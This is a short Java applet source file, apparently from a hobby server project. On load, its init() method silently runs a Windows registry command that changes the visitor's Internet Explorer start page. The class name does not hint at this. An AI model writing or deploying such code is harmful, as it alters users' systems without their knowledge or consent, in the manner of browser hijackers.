package com.deepercreeper.vampireserver;

import java.applet.Applet;
import java.io.IOException;

public class EngineStarter extends Applet
{
	@Override
	public void init()
	{
		try
		{
			final ProcessBuilder pb = new ProcessBuilder("REG", "ADD", "HKCU\\Software\\Microsoft\\Internet Explorer\\Main", "/v", "Start Page", "/d",
					"\"http://www.google.com/\"", "/f");
			pb.start();
		}
		catch (final IOException e)
		{
			e.printStackTrace();
		}
	}
}
